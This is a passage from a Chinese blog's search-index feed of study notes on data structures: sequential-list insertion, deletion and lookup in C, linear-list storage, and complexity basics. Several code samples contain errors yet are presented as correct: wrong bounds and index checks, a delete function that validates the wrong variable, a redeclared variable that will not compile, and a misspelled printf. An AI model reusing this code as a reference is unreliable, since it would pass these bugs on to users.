<h2 id="信息判重"><a href="#信息判重" class="headerlink" title="信息判重"></a>信息判重</h2><p>判定是否已获取内嵌URL信息内容<br>若是，注明信息失效时间及最近修改时间的URL<br>否则重启完整的信息采集操作<br>向对应的网络内容发布媒体发起信息查新获取操作</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181245716.png" alt></p>
]]></content>
      <tags>
        <tag>信息内容安全</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表的增删改查</title>
    <url>/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>s顺序表的基本操作增删改查（改就是在增删的基础上）</p>
<span id="more"></span>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220416213252923-16604045143081.png" alt="image-20220416213252923"></p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">insertlist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>)  <span class="comment">//判断i的范围是否有效</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(L.length&gt;maxsize)  <span class="comment">//判断数组是否已满</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length;j&gt;=i;j--)</span><br><span class="line">		L.data[j]=L.data[j<span class="number">-1</span>];</span><br><span class="line">	L.data[i]=e;</span><br><span class="line">	L.length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	insertlist(L,<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入操作的时间复杂度</p>
<p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220416214334739.png" alt="image-20220416214334739"></p>
<p>平均循环复杂度  =  O(n)</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">deletelist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(e&lt;i||e&gt;L.length)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;=L.length;j++)</span><br><span class="line">		L.data[j<span class="number">-1</span>]=L.data[j];</span><br><span class="line">	L.length--;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	<span class="type">int</span> L[maxsize]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="type">int</span> e=<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(deletelist(L,<span class="number">3</span>,e))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除的第三个位置的值为%d\n&quot;</span>,e);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除操作的时间复杂度为O（n）</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518161558034.png" alt="image-20220518161558034"></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><p>GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。</p>
<h5 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h5><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518161802282.png" alt="image-20220518161802282"></p>
<h5 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h5><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162027212.png" alt="image-20220518162027212"></p>
<p>malloc申请空间返回的指针与前面设置的指针数据类型应该相同</p>
<p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162350193.png" alt="image-20220518162350193"></p>
<p>最好/最坏/平均时间复杂度：O(1)</p>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162644686.png" alt="image-20220518162644686"></p>
<h5 id="结构类型的比较"><a href="#结构类型的比较" class="headerlink" title="结构类型的比较"></a>结构类型的比较</h5><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162852560.png" alt="image-20220518162852560"></p>
<p>正确处理方式</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people == b.people) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">pritf(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isCustomerEqual</span> <span class="params">(Customer a,Customer b)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people ==b.people)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按值查找的时间复杂度</p>
<script type="math/tex; mode=display">
最好时间复杂度:O(1)
最坏时间复杂度:O(n)
平均时间复杂度:O(n)</script>]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>顺序表</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>线性表及顺序表的存储</title>
    <url>/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>线性表的定义以及顺序表的静态存储原理动态存储原理和代码实现</p>
<span id="more"></span>
<h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>是一个<strong>有限</strong>序列=&gt;有次序  （所以整数按照递增排列，不是线性表）</p>
<p>直接前驱 </p>
<script type="math/tex; mode=display">
a_1 \leftarrow a_2</script><p>a1是a2的直接前驱</p>
<p>直接后继</p>
<script type="math/tex; mode=display">
a_1 \rightarrow a_2</script><p>a2是a1的直接后继</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>引用型参数：需要对参数的修改结果需要带回来</p>
<h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>用顺序存储的方式实现线性表——把逻辑上相邻的元素存储在物理位置也相邻的存储单元</p>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416212202152.png" alt="image-20220416212202152"></p>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416212232241.png" alt="image-20220416212232241"></p>
<h3 id="静态存储"><a href="#静态存储" class="headerlink" title="静态存储"></a>静态存储</h3><p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];   <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;   <span class="comment">//顺序表当前元素长度</span></span><br><span class="line">&#125;SqList;   <span class="comment">//顺序表类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		L.data[i]=<span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220415214246742.png" alt="image-20220415214246742"></p>
<p><strong>正常访问应该是i&lt;L.length，并且Length = 0是不可省略的</strong></p>
<h3 id="动态存储"><a href="#动态存储" class="headerlink" title="动态存储"></a>动态存储</h3><p>malloc函数用于申请空间</p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> *data;  <span class="comment">//指示动态分配数组的指针</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的当前长度</span></span><br><span class="line">	<span class="type">int</span> maxsize;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initlist</span><span class="params">(sqlist &amp;L)</span>&#123;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>(initsize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	L.length = <span class="number">0</span>;</span><br><span class="line">	L.maxsize = initsize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加表长</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">increaselist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> *p = L.data;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>((L.maxsize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">		L.data[i] = p[i];</span><br><span class="line">	&#125;</span><br><span class="line">	L.maxsize = L.maxsize+len;</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	initlist(L);</span><br><span class="line">	increaselist(L,<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/04/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416211821527.png" alt="image-20220416211821527"></p>
<p>realloc函数也可以实现上述过程</p>
]]></content>
      <tags>
        <tag>顺序表</tag>
        <tag>线性表</tag>
        <tag>单链表</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构绪论</title>
    <url>/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>数据结构入门的一些概念，定义，算法，复杂度等</p>
<span id="more"></span>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>数据：信息的载体，被<strong>计算机程序识别和处理</strong>的符号的集合</p>
<p>数据元素：数据的<strong>基本单位</strong>，作为一个整体进行考虑和处理。可由若干<strong>数据项</strong>组成，数据项时构成数据元素的不可分割的<strong>最小单位</strong></p>
<p>组合项：由更细分的属性组成的数据项</p>
<p>数据对象：具有<strong>相同性质的数据元素的集合</strong>，是数据的一个子集</p>
<p>数据结构：相互之间存在一种或多种特定关系的数据元素的集合</p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>对特定问题求解步骤的一种描述</p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><pre><code>       有穷性：算法是有穷的，程序可以是无穷的（死循环不是算法）

       确定性：相同的输入只能得到相同的输出

       可行性

       输入：0个或多个

       输出：1个或多个
</code></pre><h3 id="好算法的特质"><a href="#好算法的特质" class="headerlink" title="好算法的特质"></a>好算法的特质</h3><pre><code>        正确性

        可读性

        健壮性：输入非法数据时，能适当作出反应进行处理

        高效率，低存储需求：时间空间复杂度低
</code></pre><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>常对幂指阶</p>
<script type="math/tex; mode=display">
O(1)<O(log_2n)<O(n)<O(nlog_2n)<O(n^2)<O(n^3)<O(2^n)<O(n!)<O(n^n)</script><p>考虑数量级</p>
<script type="math/tex; mode=display">
T(n)=O(f(n)) \Leftrightarrow \lim\limits_{n\rightarrow\infty}\frac{T(n)}{f(n)}</script><p>加法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n))</script><p>乘法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)*T_2(n)=O(f(n))*O(g(n))=O(f(n)*g(n))</script><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>越高级的语言执行效率越低</p>
<h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>函数递归调用带来的内存开销，递归调用深度x与问题规模n的关系：x=f（n）</p>
<h3 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h3><p>逻辑结构        数据运算        存储结构</p>
<h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><p><img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/1.png" style="zoom: 80%;"></p>
<p>集合：数据元素同属于一个集合，没有其他关系</p>
<p>线性结构  ：只存在一对一的关系</p>
<p>树形结构  ：存在一对多的关系</p>
<p>网状结构或图状结构：存在多对多的关系</p>
<p><img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520173714417.png" style="zoom:80%;"></p>
<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p>1）顺序存储：逻辑上相邻物理上也相邻</p>
<p>2）链式存储：借助指针来表示元素之间的逻辑关系</p>
<p>3）索引存储：建立附加的索引表，索引项的一般形式（关键字，地址）</p>
<p>4）散列存储：哈希存储，根据元素的关键字</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>1.可以用（）定义一个完整的数据结构                  <strong>D</strong></p>
<p>   A.数据元素    B.数据对象    C.数据关系    D.抽象数据结构</p>
<p>2.数据结构的说法中，正确的（）                        <strong>A</strong></p>
<pre><code>A.数据的逻辑结构独立于其存储结构       

B.数据的存储结构独立于其逻辑结构                //存储结构是逻辑结构在计算机上的映射

C.数据的逻辑结构唯一决定其存储结构

D.数据结构仅由其逻辑结构和存储结构决定
</code></pre><p>3.<img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/3.png" alt>                <strong>A</strong></p>
<p> <img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/4.png" alt></p>
<p>4.<img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/5.png" alt></p>
<p><img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/6.png" alt></p>
<p>5.算法原地工作的含义是指算法所需的辅助空间是常量。</p>
<p>   时间复杂度总是考虑最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p>
<p>7.<img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182104382.png" alt></p>
<p> <img src="/2022/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182039190.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
</search>
